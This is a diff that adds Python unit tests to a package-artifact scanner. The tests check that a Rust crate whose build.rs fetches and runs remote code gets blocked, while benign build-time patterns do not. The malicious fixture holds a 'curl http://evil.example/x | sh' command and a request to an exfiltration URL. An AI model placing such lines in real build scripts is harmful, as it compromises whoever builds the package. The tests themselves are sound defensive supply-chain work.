@@ -237,6 +237,77 @@ class ArtifactAnalysisTests(unittest.TestCase):
         self.assertFalse(result["blocked"])
         self.assertEqual(result["finding_count"], 0)
 
+    def test_malicious_cargo_build_script_blocks_artifact(self):
+        # .crate files are confirmed plain gzipped tarballs -- same handling
+        # as .tgz/.tar. build.rs is cargo's "install_only" analogue to
+        # setup.py/package.json: always executed automatically at build
+        # time, before the crate itself compiles.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            artifact = Path(temp_dir) / "evilcrate-1.0.0.crate"
+            with tarfile.open(artifact, "w:gz") as archive:
+                data = (
+                    b'use std::process::Command;\n'
+                    b'fn main() {\n'
+                    b'    Command::new("sh").arg("-c").arg("curl http://evil.example/x | sh").output().unwrap();\n'
+                    b'    reqwest::blocking::get("http://evil.example/exfil").unwrap();\n'
+                    b'}\n'
+                )
+                info = tarfile.TarInfo("evilcrate-1.0.0/build.rs")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+
+            result = analyze_artifacts(temp_dir)
+
+        self.assertTrue(result["blocked"])
+        finding_codes = [finding["code"] for finding in result["findings"]]
+        self.assertIn("install_subprocess_rust", finding_codes)
+        self.assertIn("install_network_access_rust", finding_codes)
+
+    def test_rustc_version_probe_in_build_rs_is_not_flagged(self):
+        # Regression test: reproduced directly against the real, live
+        # serde@1.0.219 crate that a blanket `Command::new(` pattern
+        # false-positive-blocked it -- serde's real build.rs shells out to
+        # `Command::new(rustc).arg("--version")` to feature-gate on the
+        # compiler version, an extremely common, benign build.rs idiom
+        # (the exact same probe sandbox_wrapper.py's own
+        # ALLOWED_SUBPROCESS_PREFIXES already allowlists for PyPI/npm).
+        with tempfile.TemporaryDirectory() as temp_dir:
+            artifact = Path(temp_dir) / "serde-1.0.219.crate"
+            with tarfile.open(artifact, "w:gz") as archive:
+                data = (
+                    b'use std::env;\n'
+                    b'use std::process::Command;\n'
+                    b'fn rustc_minor_version() -> Option<u32> {\n'
+                    b'    let rustc = env::var_os("RUSTC")?;\n'
+                    b'    let output = Command::new(rustc).arg("--version").output().ok()?;\n'
+                    b'    None\n'
+                    b'}\n'
+                )
+                info = tarfile.TarInfo("serde-1.0.219/build.rs")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+
+            result = analyze_artifacts(temp_dir)
+
+        self.assertFalse(result["blocked"])
+        self.assertEqual(result["finding_count"], 0)
+
+    def test_plain_rust_file_network_call_is_not_flagged_as_install_script(self):
+        # Mirrors the plain-.js-file case above -- only build.rs specifically
+        # is install_only, not arbitrary .rs source a crate happens to ship.
+        with tempfile.TemporaryDirectory() as temp_dir:
+            artifact = Path(temp_dir) / "pkg-0.1.0.crate"
+            with tarfile.open(artifact, "w:gz") as archive:
+                data = b'pub fn fetch() { reqwest::blocking::get("https://example.com").unwrap(); }\n'
+                info = tarfile.TarInfo("pkg-0.1.0/src/lib.rs")
+                info.size = len(data)
+                archive.addfile(info, io.BytesIO(data))
+
+            result = analyze_artifacts(temp_dir)
+
+        self.assertFalse(result["blocked"])
+        self.assertEqual(result["finding_count"], 0)
+
     def test_pe_extension_with_embedded_second_pe_and_exec_indicators_still_blocks(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             artifact = Path(temp_dir) / "pkg-0.1.0.whl"
